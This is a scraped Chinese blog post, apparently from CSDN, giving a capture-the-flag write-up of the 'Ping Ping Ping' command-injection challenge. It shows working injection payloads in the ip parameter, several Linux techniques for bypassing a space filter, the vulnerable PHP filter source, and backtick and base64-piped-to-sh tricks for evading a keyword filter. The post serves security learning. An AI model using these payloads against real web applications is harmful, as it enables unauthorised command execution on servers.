{"blogid": "123099955", "writerAge": "码龄2年", "writerBlogNum": "57", "writerCollect": "83", "writerComment": "15", "writerFan": "9", "writerGrade": "3级", "writerIntegral": "629", "writerName": "m0_53065491", "writerProfileAdress": "writer_image\\profile_123099955.jpg", "writerRankTotal": "92315", "writerRankWeekly": "391177", "writerThumb": "30", "writerVisitNum": "29758", "blog_read_count": "4293", "blog_time": "于 2022-02-23 22:09:58 发布", "blog_title": "Ping Ping Ping—命令执行", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\981c08aa45704348a939329969e4cd1c.png\"/><br/> 打开创建好的环境发现提示/?ip=，第一反应应该是考命令执行<br/> <strong>构造payload /?ip=127.0.0.1;ls</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\00fd2cbbae3a4ab297a56bae4bc9a8a5.png\"/><br/> <strong>出现了flag.php，尝试读取它的内容。/?ip=127.0.0.1;cat flag.php</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\c5814f3daf3b4bf7bd0c0de3ed9ca8e8.png\"/><br/> <strong>可以发现过滤了空格，接下来就是要绕过过滤，Liunx下常见的绕过空格方式有以下几种</strong></p>\n<blockquote>\n<p>cat$IFS$1flag.php//$1-$9都可以</p>\n<p>cat${IFS}flag.php</p>\n<p>{cat,flag.php}</p>\n<p>cat&lt;flag.php</p>\n<p>cat&lt;&gt;flag.php</p>\n</blockquote>\n<p><strong>/?ip=127.0.0.1;cat$IFS$1flag.php</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\abbe1d53241545b88578fa0af7c682e8.png\"/><br/> <strong>猜测它对flag这个关键字进行了过滤，先查看index.php里的内容</strong></p>\n<pre><code class=\"prism language-bash\">/?ip<span class=\"token operator\">=</span>\nPING <span class=\"token number\">127.0</span>.0.1 <span class=\"token punctuation\">(</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">)</span>: <span class=\"token number\">56</span> data bytes\n/?ip<span class=\"token operator\">=</span>\n<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span>'<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span>\"<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">(</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">[</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">}</span>/<span class=\"token string\">\", <span class=\"token variable\">$ip</span>, <span class=\"token variable\">$match</span>)){\n    echo preg_match(\"</span>/<span class=\"token punctuation\">\\</span><span class=\"token operator\">&amp;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span>/<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span>*<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">\\</span>x<span class=\"token punctuation\">{<!-- --></span>00<span class=\"token punctuation\">}</span>-<span class=\"token punctuation\">\\</span>x<span class=\"token punctuation\">{<!-- --></span><span class=\"token number\">20</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token operator\">&gt;|</span><span class=\"token punctuation\">\\</span>'<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span>\"<span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">(</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">[</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token operator\">|</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">}</span>/<span class=\"token string\">\", <span class=\"token variable\">$ip</span>, <span class=\"token variable\">$match</span>);\n    die(\"</span>fxck your symbol<span class=\"token operator\">!</span><span class=\"token string\">\");\n  } else if(preg_match(\"</span>/ /<span class=\"token string\">\", <span class=\"token variable\">$ip</span>)){\n    die(\"</span>fxck your space<span class=\"token operator\">!</span><span class=\"token string\">\");\n  } else if(preg_match(\"</span>/bash/<span class=\"token string\">\", <span class=\"token variable\">$ip</span>)){\n    die(\"</span>fxck your bash<span class=\"token operator\">!</span><span class=\"token string\">\");\n  } else if(preg_match(\"</span>/.*f.*l.*a.*g.*/<span class=\"token string\">\", <span class=\"token variable\">$ip</span>)){\n    die(\"</span>fxck your flag<span class=\"token operator\">!</span><span class=\"token string\">\");\n  }\n  <span class=\"token variable\">$a</span> = shell_exec(\"</span><span class=\"token function\">ping</span> -c <span class=\"token number\">4</span> <span class=\"token string\">\".<span class=\"token variable\">$ip</span>);\n  echo \"</span>\n\"<span class=\"token punctuation\">;</span>\n  print_r<span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n?<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><strong>发现过滤了通配符等一系列字符，我们可以考虑使用``的形式来绕过正则限制</strong><br/> <strong>payload为/?ip=127.0.0.1;cat$IFS$1<code>ls</code>，反引号的作用是将命令的输出当做输入执行</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\4f5bf45d243c4f5397cadd81e60bac73.png\"/></p>\n<p><strong>右键查看源码，得到flag</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\ccb81f43f41b4b969c0024d983707534.png\"/><br/> <strong>另外一种解题思路</strong></p>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">echo</span><span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$1Y2F0IGZsYWcucGhw</span><span class=\"token operator\">|</span>base64<span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$1</span>-d<span class=\"token operator\">|</span><span class=\"token function\">sh</span>\n</code></pre>\n<p><strong>先对cat flag.php进行b64编码，在用base64 -d解码，最后在通过sh执行，最终执行的就是 cat flag.php</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\b8353312e97e48dfbf673cad6ea94fb6.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}